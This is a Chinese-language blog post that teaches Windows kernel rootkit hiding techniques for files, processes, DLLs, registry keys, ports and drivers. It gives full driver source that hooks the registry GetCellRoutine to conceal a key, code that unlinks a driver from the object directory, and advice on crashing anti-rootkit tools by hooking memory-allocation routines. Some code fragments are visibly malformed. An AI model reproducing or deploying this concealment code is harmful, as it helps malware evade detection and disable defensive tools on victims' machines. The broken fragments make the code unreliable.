
---
title: "Rootkit基础——隐藏"
date: 2014-06-11T09:13:30+08:00
draft: true
categories: ["Windows安全"]
tags: ["Windows安全"]
topics: ["Windows安全"]
---

Rootkit的最大用处之一就是用来隐藏自己的某些东西，比如文件、进程、dll等。功能模块往往写Ring3的应用程序，Ring0用来实现隐藏，防止被查出来。这才是合理的搭配。常见的有文件隐藏、进程隐藏、Dll隐藏、注册表隐藏、端口隐藏等。

### 文件隐藏
文件隐藏是最基本的隐藏技术，因为后门等往往是以文件形式存放在目标机。方法也有很多。

<!--more-->

可以HOOK SSDT系统服务，如HOOK ZwQueryDirectoryFile，实现对资源管理器的隐藏。不过随便一个ARK应该就能检测出来，而且vista之后的PatchGuard也是个问题。看起来这个只是理论上的方法。不过考虑到win2003和win xp依然大行其道，以及一些已知漏洞，简单的方法也是有学习的价值的。

那么如何防止自己的用来隐藏文件的RK被查出来呢，有一招很厉害（现在可能会被防了）：既然ARK要防RK，即要检查是否hook，那么就得用到内存池，所以我们hook ExAllocatePool**和NtAllocate**等函数，然后ARK就挂了 我了解到这个技术的时候真是有点小激动啊。

还可以通过NTFS文件系统的一些特性来隐藏文件，比如IRP拦截等，这个我也不是很熟悉，没有具体写过，以后有机会再写。

### 进程隐藏
进程隐藏几乎是大神们发挥想象力最佳靶，不管是hook内核函数，还是修改结构，都会有让人惊叹的隐藏技巧。

最基本的就是ActiveProcessLinks，几乎是每一个菜鸟学习rootkit的第一课。执行体进程结构EPROCESS有一个成员ActiveProcessLinks链表，将所有活动进程以双向链表形式链接。可以遍历链表，然后将需要隐藏的那一个节点断下来，达到隐藏的目的。类似的技术还有HandleTableList和WorkingSetExpansionLinks，同样的原理，都是断链。

另一种比较经典的技术是擦除句柄表。PspCidTable是进程全局句柄表，关于这个东西可以看我前面的一篇文章。还可以断csrss.exe句柄表，环境子系统进程是系统重要的一环。这里可能会用到ExEnumHandleTable函数遍历句柄表的句柄，用MmGetSystemRoutineAddress获取函数地址，然后提供一个遍历句柄回调函数。枚举当前进程的所有线程，在上述两个句柄表中擦除线程句柄，最后再擦除当前进程的进程句柄。

hook作为万能法，肯定也是隐藏进程的利器。如hook ZwQuerySystemInformation。还有对进程对象进行的各种奇葩操作，擦除信息，如擦除线程计数、句柄计数等。

进程创建和线程管理是很复杂的问题，其中涉及到的东西也特别多，所以可以操作的点也很多。

### dll隐藏
dll隐藏最经典的无疑是EPROCESS的ldr成员——_PEB_LDR_DATA结构成员。


```

0: kd> dt nt!_PEB_LDR_DATA
   +0x000 Length           : Uint4B
   +0x004 Initialized      : UChar
   +0x008 SsHandle         : Ptr32 Void
   +0x00c InLoadOrderModuleList : _LIST_ENTRY
   +0x014 InMemoryOrderModuleList : _LIST_ENTRY
   +0x01c InInitializationOrderModuleList : _LIST_ENTRY
   +0x024 EntryInProgress  : Ptr32 Void

```

三个和dll有关的双向链表，所以断链是一种方法。

通过VAD(虚拟地址描述符)也是一种比较好的方法，早些年甚至能骗过大部分ARK。虚拟地址描述符是Windows内存管理的重要结构，通过VAD内存管理器可以快速判断哪些地址已经提交、处理访问错误等。EPROCESS的RootVad是一个二叉树，所以可以通过简单的二叉树遍历来查找进程dll，找到之后将其擦除即可。

### 注册表隐藏
注册表由执行体组件配置管理器操作.

直接HOOK注册表查找函数是一种方法，可以看一下注册表操作函数进入ring0之后调用的是什么函数，然后将其HOOK。这也容易被查出来。

另一种方法是利用hive文件和注册表本身的特性，属于**专藏**。注册表数据放在cell里，cell索引类似虚拟地址，需要通过一个函数计算才能得到cell数据块CELL_DATA。这个函数的地址保存在HHIVE结构中。


```

lkd> dt   _HHIVE
nt!_HHIVE
    +0x000 Signature         : Uint4B
    +0x004 GetCellRoutine    : Ptr32      _CELL_DATA*

```

GetCellRoutine接收cell索引CELL_INDEX作为参数，返回CELL_DATA结构。

应用程序打开注册表键会返回一个类似句柄的东西，该句柄在内核中对应_cm_key_body结构，由配置管理器创建；该结构有一个成员_CM_KEY_CONTROL_BLOCK，控制块，及KCB。在控制块中可以找到我们要隐藏的KEY_INDEX和HHIVE结构。

因为注册表的结构很奇特，键之间似乎是链接起来的，而且还有父子关系，所以自己写的GetCellRoutine函数需要做一些判断。这里直接放一个网上流传甚广的代码。


```

#include "ntddk.h"

#define GET_PTR(ptr, offset) \
	( *(PVOID*)( (ULONG)ptr + (offset##Offset) ))

#define CM_KEY_INDEX_ROOT	0x6972
#define CM_KEY_INDEX_LEAF	0x696C
#define CM_KEY_FAST_LEAF	0x666C
#define CM_KEY_HASH_LEAF	0x686C

#pragma pack(1)
typedef struct _CM_KEY_NODE {
	USHORT Signature;
	USHORT Flags;
	LARGE_INTEGER LastWriteTime;
	ULONG Spare;               // used to be TitleIndex
	HANDLE Parent;
	ULONG SubKeyCounts[2];     // Stable and Volatile
	HANDLE SubKeyLists[2];     // Stable and Volatile
	// ...
} CM_KEY_NODE, *PCM_KEY_NODE;

typedef struct _CM_KEY_INDEX {
	USHORT Signature;
	USHORT Count;
	HANDLE List[1];
} CM_KEY_INDEX, *PCM_KEY_INDEX;

typedef struct _CM_KEY_BODY {
	ULONG Type;                // "ky02"
	PVOID KeyControlBlock;
	PVOID NotifyBlock;
	PEPROCESS Process;         // the owner process
	LIST_ENTRY KeyBodyList; // key_nodes using the same kcb
} CM_KEY_BODY, *PCM_KEY_BODY;

typedef PVOID (__stdcall *PGET_CELL_ROUTINE)(PVOID, HANDLE);

typedef struct _HHIVE {
	ULONG Signature;
	PGET_CELL_ROUTINE GetCellRoutine;
	// ...
} HHIVE, *PHHIVE;
#pragma pack()

WCHAR g_HideKeyName[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Beep";

PGET_CELL_ROUTINE g_pGetCellRoutine = NULL;
PGET_CELL_ROUTINE* g_ppGetCellRoutine = NULL;

PCM_KEY_NODE g_HideNode = NULL;
PCM_KEY_NODE g_LastNode = NULL;

HANDLE OpenKeyByName(PCWSTR pwcsKeyName)
{
	NTSTATUS status;
	UNICODE_STRING uKeyName;
	OBJECT_ATTRIBUTES oa;
	HANDLE hKey;
	RtlInitUnicodeString(&uKeyName, pwcsKeyName);
	InitializeObjectAttributes(&oa, 
		&uKeyName, 
		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
		NULL,
		NULL);
	status = ZwOpenKey(&hKey, KEY_READ, &oa);
	if (status != STATUS_SUCCESS)
	{
		DbgPrint("ZwOpenKey failed\n");
		return NULL;
	}
	return hKey;
}

PVOID GetKeyControlBlock(HANDLE hKey)
{
	NTSTATUS status;
	PCM_KEY_BODY KeyBody;
	PVOID kcb;

	if (hKey == NULL)
		return NULL;

	status = ObReferenceObjectByHandle(hKey,
		KEY_READ,
		NULL,
		KernelMode,
		&KeyBody,
		NULL);
	if (status != STATUS_SUCCESS)
	{
		DbgPrint("ObreferencedObjectByHandle Failed\n");
		return NULL;
	}

	kcb = KeyBody-> KeyControlBlock;
	ObDereferenceObject(KeyBody);
	return kcb;
}

PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node)
{
	PCM_KEY_NODE ParentNode = (PCM_KEY_NODE)g_pGetCellRoutine(Hive, Node-> Parent);
	PCM_KEY_INDEX Index = (PCM_KEY_INDEX)g_pGetCellRoutine(Hive, ParentNode-> SubKeyLists[0]);

	DbgPrint("ParentNode = %lx\nIndex = %lx\n", ParentNode, Index);

	if (Index-> Signature == CM_KEY_INDEX_ROOT)
	{
		Index = (PCM_KEY_INDEX)g_pGetCellRoutine(Hive, Index-> List[Index-> Count - 1]);
		DbgPrint("Index = %lx\n", Index);
	}

	if (Index-> Signature == CM_KEY_FAST_LEAF || Index-> Signature == CM_KEY_HASH_LEAF)
	{
		return g_pGetCellRoutine(Hive, Index-> List[2*(Index-> Count-1)]);
	}
	else
	{
		return g_pGetCellRoutine(Hive, Index-> List[Index-> Count-1]);
	}
}

PVOID MyGetCellRoutine(PVOID Hive, HANDLE Cell)
{
	PVOID pRet = g_pGetCellRoutine(Hive, Cell);
	if (pRet)
	{
		if (pRet == g_HideNode)
		{
			DbgPrint("GetCellRoutine(%lx, %08lx) == %lx\n", Hive, Cell, pRet);
			pRet = g_LastNode = (PCM_KEY_NODE)GetLastKeyNode(Hive, g_HideNode);
			DbgPrint("g_LastNode = %lx\n", g_LastNode);
			if (pRet == g_HideNode) pRet = NULL;
		}
		else if (pRet == g_LastNode)
		{
			DbgPrint("GetCellRoutine(%lx, %08lx) == %lx\n", Hive, Cell, pRet);
			pRet = g_LastNode = NULL;
		}
	}
	return pRet;
}

NTSTATUS DriverUnload(PDRIVER_OBJECT pDrvObj)
{
	DbgPrint("DriverUnload()\n");
	if (g_ppGetCellRoutine)
		*g_ppGetCellRoutine = g_pGetCellRoutine;
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDrvObj, PUNICODE_STRING pRegPath)
{
	ULONG BuildNumber;
	ULONG KeyHiveOffset;       // KeyControlBlock-> KeyHive
	ULONG KeyCellOffset;       // KeyControlBlock-> KeyCell
	HANDLE hKey;
	PVOID KCB, Hive;

	DbgPrint("DriverEntry()\n");
	pDrvObj-> DriverUnload = DriverUnload;

	if (PsGetVersion(NULL, NULL, &BuildNumber, NULL)) 
		return STATUS_NOT_SUPPORTED;
	DbgPrint("BuildNumber = %d\n", BuildNumber);

	switch (BuildNumber)
	{
	case 2195:     // Win2000
		KeyHiveOffset = 0xc;
		KeyCellOffset = 0x10;
		break;
	case 2600:     // WinXP
	case 3790:     // Win2003
		KeyHiveOffset = 0x10;
		KeyCellOffset = 0x14;
		break;
	default:
		return STATUS_NOT_SUPPORTED;
	}


	hKey = OpenKeyByName(g_HideKeyName);
	KCB = GetKeyControlBlock(hKey);
	if (KCB)
	{
		PHHIVE Hive = (PHHIVE)GET_PTR(KCB, KeyHive);
		g_ppGetCellRoutine = &Hive-> GetCellRoutine;
		g_pGetCellRoutine = Hive-> GetCellRoutine;
		DbgPrint("GetCellRoutine = %lx\n", g_pGetCellRoutine);
		g_HideNode = (PCM_KEY_NODE)g_pGetCellRoutine(Hive, GET_PTR(KCB, KeyCell));
		Hive-> GetCellRoutine = MyGetCellRoutine;
	}
	ZwClose(hKey);

	return STATUS_SUCCESS;
}


```

### 端口隐藏
这个我只做过HOOK的，没什么意思。

Windows网络也是很复杂的一块儿，没仔细学习过，正在补洞中。

### 驱动隐藏
驱动隐藏是很重要的，也是整个理想Rootkit的最后一步，所有的小九九都被隐藏了，然后自己隐藏起来，深藏功与名，真是不错。

最常见的还是断链。DRIVER_OBJECT结构的DriverSection是LDR_DATA_TABLE_ENTRY双向链表，将驱动和ntoskrnl.exe等链起来，所以可以遍历查找然后断开。


```

kd> dt _driver_object
nt!_DRIVER_OBJECT
   +0x000 Type             : Int2B
   +0x002 Size             : Int2B
   +0x004 DeviceObject     : Ptr32 _DEVICE_OBJECT
   +0x008 Flags            : Uint4B
   +0x00c DriverStart      : Ptr32 Void
   +0x010 DriverSize       : Uint4B
   +0x014 DriverSection    : Ptr32 Void

```


```

kd> dt _LDR_DATA_TABLE_ENTRY
nt!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY
   +0x008 InMemoryOrderLinks : _LIST_ENTRY
   +0x010 InInitializationOrderLinks : _LIST_ENTRY
   +0x018 DllBase          : Ptr32 Void
   +0x01c EntryPoint       : Ptr32 Void
   +0x020 SizeOfImage      : Uint4B
   +0x024 FullDllName      : _UNICODE_STRING
   +0x02c BaseDllName      : _UNICODE_STRING

```

另一种方法是将驱动从/drivers目录中抹去。可以用ObOpenObjectByName打开驱动目录，或者通过对象结构体-0x18得到对象头，然后再-0x10得到对象头名称信息OBJECT_HEADER_NAME_INFO，在该结构中有_OBJECT_DIRECTORY结构的Directory成员。

目录对象的滴一个成员HashBuckets是_OBJECT_DIRECTORY_ENTRY结构，该结构是一个hash表，对象存放在hash表中，所以可以对_OBJECT_DIRECTORY_ENTRY搜索，找到驱动名称的hash值所在的链，然后抹掉信息。


```

ULONG GetObjectHashByName(PWCHAR ObjectName)
{
	ULONG HashIndex=0;
	ULONG WcharLength;
	ULONG Wchar;
	WcharLength=wcslen(ObjectName);
	while (WcharLength--) 
	{   
		Wchar = *ObjectName++;   
		HashIndex += (HashIndex << 1) + (HashIndex > > 1);  
		if (Wchar < 'a') 
		{                
			HashIndex += Wchar;   
		} else if (Wchar > 'z') 
		{                
			HashIndex += RtlUpcaseUnicodeChar( (WCHAR)Wchar );   
		} else 
		{                
			HashIndex += (Wchar - ('a'-'A'));         
		}     
	}     
	HashIndex %= NUMBER_HASH_BUCKETS;//NUMBER_HASH_BUCKETS是个宏，值为37
	return HashIndex;
}
/******************************************************/
NTSTATUS HideModuleFromDriverDirectory()
{
	POBJECT_HEADER pObjectHeader;
	POBJECT_HEADER_NAME_INFO pObjectHeaderNameInfo;
	POBJECT_DIRECTORY pObjectDirectory;
	POBJECT_DIRECTORY_ENTRY pObjectDirectoryEntry,tmp;
	PWCHAR ObjectName=NULL;
	ULONG CurrentHash;
	ULONG DriverObject;
	ANSI_STRING aTempChar={0};
	
	DbgPrint("待隐藏驱动对象地址:%x\n",g_pDriverObject);

    
	pObjectHeader = g_pDriverObject-0x18;
	DbgPrint("待隐藏驱动对象头地址:%x\n",pObjectHeader);

	pObjectHeader-> Type=0;

	(ULONG)pObjectHeaderNameInfo=(ULONG)pObjectHeader-*(BYTE*)((ULONG)pObjectHeader+0x0c);
	DbgPrint("待隐藏驱动对象头名称结构:%x\n",pObjectHeaderNameInfo);

	(ULONG)pObjectDirectory=*(ULONG*)((ULONG)pObjectHeaderNameInfo);
	DbgPrint("待隐藏驱动对象头目录对象地址:%x\n",pObjectDirectory);
	
	RtlUnicodeStringToAnsiString(&aTempChar,&(pObjectHeaderNameInfo-> Name),TRUE);
	
	//ObjectName=pObjectHeaderNameInfo-> Name;
	DbgPrint("名称:%wZ\n",&(pObjectHeaderNameInfo-> Name));
	
	CurrentHash=GetObjectHashByName(L"ThunderNetWork");
	DbgPrint("本驱动名称哈希值:%d\n",CurrentHash);

	pObjectDirectoryEntry=pObjectDirectory-> HashBuckets[CurrentHash];
	DbgPrint("本驱动ObjectDirectoryEntry链表地址:%x\n",pObjectDirectoryEntry);
	DriverObject=pObjectDirectoryEntry-> Object;
	DbgPrint("第一个驱动对象地址:%x\n",DriverObject);
	
	if(DriverObject==g_pDriverObject)//如果在链表头
	{
		DbgPrint("驱动对象目录匹配成功\n");
		pObjectDirectoryEntry-> Object=NULL;//抹掉驱动对象
		pObjectDirectory-> HashBuckets[CurrentHash]=pObjectDirectoryEntry-> ChainLink;//更新链表头
	}
	else
	{
		while(pObjectDirectoryEntry-> ChainLink!=NULL)
		{
			tmp=pObjectDirectoryEntry-> ChainLink;
			DriverObject=tmp-> Object;
	        DbgPrint("遍历到驱动对象地址:%x\n",DriverObject);
	
	        if(DriverObject==g_pDriverObject)
	        {
				DbgPrint("驱动对象目录匹配成功\n");
		        tmp-> Object=NULL;
				pObjectDirectoryEntry-> ChainLink=tmp-> ChainLink;
				break;
	        }
			pObjectDirectoryEntry=tmp;
		}
	}
}``````

```

还可以通过POBJECT_HEADER_CREATOR_INFO链来隐藏驱动，也是我刚学到的新姿势。

总之隐藏技术多，且学且珍惜。
